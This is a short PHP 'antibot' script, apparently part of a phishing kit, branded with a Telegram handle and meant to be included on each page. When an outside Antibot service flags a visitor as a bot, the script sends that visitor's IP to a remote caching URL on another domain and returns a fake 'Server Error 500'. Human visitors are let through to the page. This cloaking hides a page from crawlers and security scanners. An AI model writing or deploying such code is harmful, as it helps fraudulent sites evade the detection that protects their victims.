<?php

/** Telegram : @m3dular
 * DO NOT MODIFY
 * 
 *  REDESIGNED ny m3dular... aims to deliver each antibot check on a per page basis.... 
 * 
 * if needed by a simple include and not worriying about the normal ass routine... inject your antibot pw key and use everywhere you need a check
 * if bot loading should die.
 * 
 */
require_once('autoload.php');

$cacheurl="https://urbanprices.com/m3dcache/cache.php"; //bot ipaddress caching
/*
m3dular antibot pw intergration

*/


if(true){
    $respons = $Antibot->redirect( $config['apikey'] , $querykey);
    $json    = $Antibot->json($respons);
    if($json['status'] == false){
        $Antibot->error(100 , $json['message']);
    }
    if(empty($json['direct_url'])){


    

        $Antibot->error(404);
    }


        if($json['is_bot'] == true){

            
      // if current traffic is a bot....
      $legiturl=$json['direct_url'];

      $currentbotip=$json['info']['ipinfo']['query'];

      // do an ipaddress cache neatly
      $contents = file_get_contents($cacheurl.'?botip='.$currentbotip);

        die('Server Error 500:');

        }



    // die(header("Location: ". $legiturl)); // should redirect here but no lets just let the page load normally....
    // ensure you die up above ...

}else{
    $Antibot->error(404);
}